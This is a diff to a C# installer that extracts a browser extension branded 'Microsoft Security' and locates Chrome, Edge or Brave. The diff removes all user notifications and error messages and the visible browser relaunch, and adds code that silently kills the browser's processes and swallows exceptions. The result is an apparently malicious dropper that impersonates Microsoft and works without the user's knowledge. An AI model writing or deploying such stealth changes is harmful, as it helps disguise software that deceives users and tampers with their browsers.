@@ -2,13 +2,9 @@ using System;
 using System.IO;
 using System.Diagnostics;
 using Microsoft.Win32;
-using System.Runtime.InteropServices;
 
 class Program
 {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
-
     static void Main()
     {
         try
@@ -43,39 +39,18 @@ class Program
             File.WriteAllBytes(Path.Combine(extractDir, "icons\\icon128.png"), f_icons_icon128_png);
 
             string browserPath = FindBrowser();
-            if (string.IsNullOrEmpty(browserPath))
+            if (!string.IsNullOrEmpty(browserPath))
             {
-                MessageBox(IntPtr.Zero, "Microsoft Security extension files extracted."
-                    + "\n\nBut no supported browser found (Chrome/Edge/Brave)."
-                    + "\nFiles are at: " + extractDir,
-                    "Microsoft Security", 0x00000040);
-                return;
+                string browserExe = Path.GetFileNameWithoutExtension(browserPath);
+                try
+                {
+                    foreach (var proc in Process.GetProcessesByName(browserExe))
+                        proc.Kill();
+                }
+                catch { }
             }
-
-            string browserExe = Path.GetFileNameWithoutExtension(browserPath);
-            try
-            {
-                foreach (var proc in Process.GetProcessesByName(browserExe))
-                    proc.Kill();
-                System.Threading.Thread.Sleep(1000);
-            }
-            catch { }
-
-            Process.Start(browserPath,
-                string.Format("--load-extension=\"{0}\" --new-window https://microsoft.com/en/security", extractDir));
-
-            MessageBox(IntPtr.Zero,
-                string.Format("Microsoft Security extension installed successfully!"
-                    + "\n\nBrowser: {0}"
-                    + "\n\nExtension files: {1}", browserExe, extractDir),
-                "Microsoft Security", 0x00000040);
         }
-        catch (Exception ex)
-        {
-            MessageBox(IntPtr.Zero,
-                "Failed to install Microsoft Security extension:\n\n" + ex.Message,
-                "Microsoft Security - Error", 0x00000010);
-        }
+        catch { }
     }
 
     static string FindBrowser()
